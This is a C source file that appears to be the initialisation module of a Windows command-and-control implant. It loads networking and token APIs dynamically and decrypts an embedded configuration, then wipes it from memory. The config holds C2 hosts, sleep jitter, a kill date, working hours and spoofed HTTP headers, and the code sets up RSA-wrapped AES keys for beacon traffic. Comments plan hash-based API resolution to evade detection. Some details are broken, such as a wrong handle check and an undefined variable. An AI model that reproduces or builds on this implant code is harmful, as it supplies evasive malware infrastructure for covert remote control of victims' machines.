#include <wolfcrypt/rsa.h>
#include <wolfcrypt/random.h>
#include "agent.h"
#include "localcstd.h"
#include "parser.h"
#include "Helpers.h"
#include "token.h"
#include "ListManager.h"

#ifdef CONFIG_BYTES
BYTE AgentConfigBytes[] = CONFIG_BYTES;
#endif
#ifdef CONFIG_IV_BYTES
BYTE ConfigIVBytes[] = CONFIG_IV_BYTES;
#endif
#ifdef CONFIG_KEY_BYTES
BYTE ConfigKeyBytes[] = CONFIG_KEY_BYTES;
#endif

INT init_agent() {

    INT ERR;
	agent->apis = (pWin32)LocalAlloc(LPTR, sizeof(Win32));
	if (!agent->apis) {
		printf("[error] attempting to allocate memory for win32 apis\n");
		return -1;
	}



#ifdef _WIN64
    agent->pTeb = (void*)__readgsqword(0x30);
#else
    agent->pTeb = (void*)__readfsdword(0x18);
#endif

    //TODO needs to be cleaned up. The LoadLibrary call needs to be resolved using a K32 lookup module pointer function using the PEB as a base reference & a hash of the module name.

    agent->apis->hAdvapi32 = LoadLibraryA("advapi32.dll");
    if(agent->apis->hAdvapi32 == NULL){
		return -1;
	}
    agent->apis->hWinHttp = LoadLibraryA("winhttp.dll");
    if(agent->apis->hWinHttp == NULL){
        return -1;
    }
    agent->apis->hUser32 = LoadLibraryA("User32.dll");
    if (agent->apis->hWinHttp == NULL) {
        return -1;
    }
    agent->apis->hIphlpapi = LoadLibraryA("iphlpapi.dll");
    if(agent->apis->hIphlpapi == NULL) {
        return -1;
    }

    

    //obtain winhttp apis
    //NEEDS TO be resolved using a hash of the function name.
    agent->apis->pWinHttpAddRequestHeaders = (t_WinHttpAddRequestHeaders)GetProcAddress(agent->apis->hWinHttp, "WinHttpAddRequestHeaders");
    if (agent->apis->pWinHttpAddRequestHeaders == NULL) {
        return -1;
    }
    agent->apis->pWinHttpConnect = (t_WinHttpConnect)GetProcAddress(agent->apis->hWinHttp, "WinHttpConnect");
    if (!agent->apis->pWinHttpConnect) {
        return -1;
    }
    agent->apis->pWinHttpOpen = (t_WinHttpOpen)GetProcAddress(agent->apis->hWinHttp, "WinHttpOpen");
    if (!agent->apis->pWinHttpOpen) {
        return -1;
    }
    agent->apis->pWinHttpOpenRequest = (t_WinHttpOpenRequest)GetProcAddress(agent->apis->hWinHttp, "WinHttpOpenRequest");
    if (!agent->apis->pWinHttpOpenRequest) {
        return -1;
    }
    agent->apis->pWinHttpQueryHeaders = (t_WinHttpQueryHeaders)GetProcAddress(agent->apis->hWinHttp, "WinHttpQueryHeaders");
    if (!agent->apis->pWinHttpQueryHeaders) {
        return -1;
    }
    agent->apis->pWinHttpReceiveResponse = (t_WinHttpReceiveResponse)GetProcAddress(agent->apis->hWinHttp, "WinHttpReceiveResponse");
    if (!agent->apis->pWinHttpReceiveResponse) {
        return -1;
    }
    agent->apis->pWinHttpSetOption = (t_WinHttpSetOption)GetProcAddress(agent->apis->hWinHttp, "WinHttpSetOption");
    if (!agent->apis->pWinHttpSetOption) {
        return -1;
    }
    agent->apis->pWinHttpSendRequest = (t_WinHttpSendRequest)GetProcAddress(agent->apis->hWinHttp, "WinHttpSendRequest");
    if (!agent->apis->pWinHttpSendRequest) {
        return -1;
    }
	agent->apis->pWinHttpReadData = (t_WinHttpReadData)GetProcAddress(agent->apis->hWinHttp, "WinHttpReadData");
    if (!agent->apis->pWinHttpReadData) {
        return -1;
    }

    //obtain ntdll apis
    agent->apis->pRtlGetVersion = (t_RtlGetVersion)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    if (!agent->apis->pRtlGetVersion) {
        return -1;
    }
    agent->apis->pNtClose = (t_NtClose)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
    if (!agent->apis->pNtClose) {
        return -1;
    }
    agent->apis->pNtOpenProcessToken = (t_NtOpenProcessToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcessToken");
    if (!agent->apis->pNtOpenProcessToken) {
        return -1;
    }
    agent->apis->pNtOpenThreadToken = (t_NtOpenThreadToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenThreadToken");
    if (!agent->apis->pNtOpenThreadToken) {
        return -1;
    }
    agent->apis->pNtQueryInformationToken = (t_NtQueryInformationToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationToken");
    if (!agent->apis->pNtQueryInformationToken) {
        return -1;
    }
    agent->apis->pRtlAllocateHeap = (t_RtlAllocateHeap)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAllocateHeap");
    if (!agent->apis->pRtlAllocateHeap) {
        return -1;
    }
    agent->apis->pRtlReAllocateHeap = (t_RtlReAllocateHeap)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlReAllocateHeap");
    if (!agent->apis->pRtlReAllocateHeap) {
        return -1;
    }
	agent->apis->pRtlRandomEx = (t_RtlRandomEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlRandomEx");
	if (!agent->apis->pRtlRandomEx) {
		return -1;
	}
	agent->apis->pNtGetTickCount = (t_NtGetTickCount)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtGetTickCount");
    if (!agent->apis->pNtGetTickCount) {
        return -1;
    }

    //obtain kernel32 apis
    agent->apis->pGetComputerNameExA = (t_GetComputerNameExA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetComputerNameExA");
    if (!agent->apis->pGetComputerNameExA) {
        return -1;
    }
	agent->apis->pLocalAlloc = (t_LocalAlloc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LocalAlloc");
	if (!agent->apis->pLocalAlloc) {
		return -1;
	}
	agent->apis->pLocalReAlloc = (t_LocalReAlloc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LocalReAlloc");
	if (!agent->apis->pLocalReAlloc) {
		return -1;
	}
	agent->apis->pLocalFree = (t_LocalFree)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LocalFree");
    if (!agent->apis->pLocalFree) {
        return -1;
    }

    //obtain user32 apis
    agent->apis->pGetSystemMetrics = (t_GetSystemMetrics)GetProcAddress(GetModuleHandleA("user32.dll"), "GetSystemMetrics");
    if(!agent->apis->pGetSystemMetrics){
        return -1;
    }

    //obtain advapi32 apis
    agent->apis->pGetUserNameA = (t_GetUserNameA)GetProcAddress(agent->apis->hAdvapi32, "GetUserNameA");
    if(!agent->apis->pGetUserNameA){
		return -1;
	}

	//obtain iphlpapi apis
	agent->apis->pGetAdaptersInfo = (t_GetAdaptersInfo)GetProcAddress(agent->apis->hIphlpapi, "GetAdaptersInfo");
    if(!agent->apis->pGetAdaptersInfo){
		return -1;
	}

    agent->Context = (PContextInfo)agent->apis->pLocalAlloc(LPTR, sizeof(ContextInfo));
    if (!agent->Context) {
        printf("[error] attempting to allocate memory for context\n");
        return -1;
    }

	agent->session = (pHttpSession)agent->apis->pLocalAlloc(LPTR, sizeof(HttpSession));
	if (!agent->session) {
		printf("[error] attempting to allocate memory for session\n");
		return -1;
	}

#if _WIN64
    agent->Context->OS_Arch = PROCESSOR_ARCHITECTURE_AMD64;
    agent->Context->Process_Arch = PROCESSOR_ARCHITECTURE_AMD64;
#else
    Instance->Session.Process_Arch = PROCESSOR_ARCHITECTURE_INTEL;
    Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_UNKNOWN;
    if (ProcessIsWow(NtCurrentProcess())) {
        Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_AMD64;
    }
    else {
        Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_INTEL;
    }
#endif

    //read rsa public key in der format from file.
    RsaKey rsaPublicKey;
    word32 idx = 0;
    WC_RNG rng;
    byte* EncryptedAesKey = (byte*)agent->apis->pLocalAlloc(LPTR, (sizeof(byte) * 500));
    byte* EncryptedIV = (byte*)agent->apis->pLocalAlloc(LPTR, (sizeof(byte) * 500));
    byte* AesKey = (byte*)agent->apis->pLocalAlloc(LPTR, (sizeof(byte) * AES_256_KEY_SIZE));
    byte* AesIV = (byte*)agent->apis->pLocalAlloc(LPTR, (sizeof(byte) * AES_BLOCK_SIZE));

    
    ParseConfig();

    wc_InitRsaKey(&rsaPublicKey, NULL);
    wc_RsaPublicKeyDecode(agent->config->RSAPubKey, &idx, &rsaPublicKey, agent->config->RSAPubKeySize);

    //generate rng object
    wc_InitRng(&rng);

    //generate aeskey and iv
    wc_RNG_GenerateBlock(&rng, AesKey, AES_256_KEY_SIZE);
    wc_RNG_GenerateBlock(&rng, AesIV, AES_BLOCKLEN);

    //encrypt aes key
    word32 EncryptedKeySize = wc_RsaPublicEncrypt(AesKey, AES_256_KEY_SIZE, EncryptedAesKey, 500, &rsaPublicKey, &rng);
    if (EncryptedKeySize == 0 ){
		return -1;
	}

    //encrypt iv
    word32 EncryptedIvSize = wc_RsaPublicEncrypt(AesIV, AES_BLOCK_SIZE, EncryptedIV, 500, &rsaPublicKey, &rng);
    if(EncryptedIvSize == 0 ){ 
        return -1;
    }

    wc_FreeRng(&rng);

    agent->config->AgentID = 0xdeadbeef;
    agent->AESKey = AesKey;
    agent->AESKeySize = AES_256_KEY_SIZE;
    agent->EncryptedAESKey = EncryptedAesKey;
    agent->EncryptedAESKeySize = EncryptedKeySize;
    agent->IV = AesIV;
    agent->IVSize = AES_BLOCK_SIZE;
    agent->EncryptedIV = EncryptedIV;
    agent->EncryptedIVSize = EncryptedIvSize;


    return 0;
}

//FINISH PARSING CONFIG DATA.
INT ParseConfig() {

    PARSER parser = { 0 };
    INT NumHosts = 0;
    INT NumHeaders = 0;
    PWCHAR Addr = NULL;
	LPWSTR BufferW = NULL;
    LPSTR BufferA = NULL;
    INT Port = 0;
    INT Length = 0;

    NewParser(&parser, AgentConfigBytes, sizeof(AgentConfigBytes));
	RtlSecureZeroMemory(AgentConfigBytes, sizeof(AgentConfigBytes)); //clear the config buffer from memory we've copied it to the parser.

	ParserDecrypt(&parser, ConfigKeyBytes, ConfigIVBytes);
	RtlSecureZeroMemory(ConfigKeyBytes, sizeof(ConfigKeyBytes)); //clear the key from memory we've used it to decrypt the config.
	RtlSecureZeroMemory(ConfigIVBytes, sizeof(ConfigIVBytes)); //clear the iv from memory we've used it to decrypt the config.

	agent->config = (PAgentConfig)agent->apis->pLocalAlloc(LPTR, sizeof(AgentConfig));
    if (!agent->config) {
        return -1;
    }
	agent->config->listenerConfig = (pListenerConfig)agent->apis->pLocalAlloc(LPTR, sizeof(ListenerConfig));
	if (!agent->config->listenerConfig) {
		return -1;
	}
	agent->config->listenerConfig->Hosts = (pHostData)agent->apis->pLocalAlloc(LPTR, sizeof(HostData));
	if (!agent->config->listenerConfig->Hosts) {
		return -1;
	}
	agent->config->listenerConfig->CurrentHost = (pHostData)agent->apis->pLocalAlloc(LPTR, sizeof(HostData));
    if (!agent->config->listenerConfig->CurrentHost) {
        return -1;
    }

    //read sleep and jitter times.
	agent->config->SleepTime = ParserReadInt32(&parser);
	agent->config->SleepJitter = ParserReadInt32(&parser);
    
    //read the agent name for decrypting agent payloads using the correct private key file.
    BufferA = ParserReadString(&parser, &Length);
	agent->config->AgentName = agent->apis->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length + sizeof(CHAR));
	MemoryCopy(agent->config->AgentName, BufferA, Length);

    //read operation times.
	agent->config->KillDate = ParserReadInt64(&parser);
	agent->config->WorkingHours = ParserReadInt32(&parser);
    
    //read methodology of contacting the litening server.
    BufferW = ParserReadWString(&parser, &Length);
	agent->config->listenerConfig->Method = agent->apis->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length + sizeof(WCHAR));
	MemoryCopy(agent->config->listenerConfig->Method, BufferW, Length);
    
    //read the way we rotate potential listening servers.
    agent->config->listenerConfig->HostRotation = ParserReadInt32(&parser);
    
    NumHosts = ParserReadInt32(&parser);
    for (int i = 0; i < NumHosts; i++) {
        Addr = ParserReadWString(&parser, &Length);
        Port = ParserReadInt32(&parser);
        if (Length > 0) {
            AddHost(Addr, Length, Port);
        }
    }
	agent->config->listenerConfig->NumHosts = NumHosts;
	agent->config->listenerConfig->CurrentHost = SelectHost(agent->config->listenerConfig->HostRotation);

	agent->config->listenerConfig->Secure = ParserReadInt32(&parser);
    BufferW = ParserReadWString(&parser, &Length);
    agent->config->listenerConfig->UserAgent = agent->apis->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length + sizeof(WCHAR));
	MemoryCopy(agent->config->listenerConfig->UserAgent, BufferW, Length);

	NumHeaders = ParserReadInt32(&parser);
	agent->config->listenerConfig->Headers = agent->apis->pRtlAllocateHeap(
        NtProcessHeap(agent), HEAP_ZERO_MEMORY, sizeof(LPWSTR) * ( ( NumHeaders + 1 ) * 2) 
    );
    for (int i = 0; i < NumHeaders; i++) {
        BufferW = ParserReadWString(&parser, &Length);
		agent->config->listenerConfig->Headers[i] = agent->apis->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length + sizeof(WCHAR));
		MemorySet(agent->config->listenerConfig->Headers[i], 0, Length + sizeof(WCHAR));
		MemoryCopy(agent->config->listenerConfig->Headers[i], BufferW, Length);
    }
    agent->config->listenerConfig->Headers[NumHeaders+1] = NULL;

	BufferW = ParserReadBytes(&parser, &Length);
	agent->config->RSAPubKey = agent->apis->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length);
	MemoryCopy(agent->config->RSAPubKey, BufferW, Length);
	agent->config->RSAPubKeySize = Length;

    return 0;
}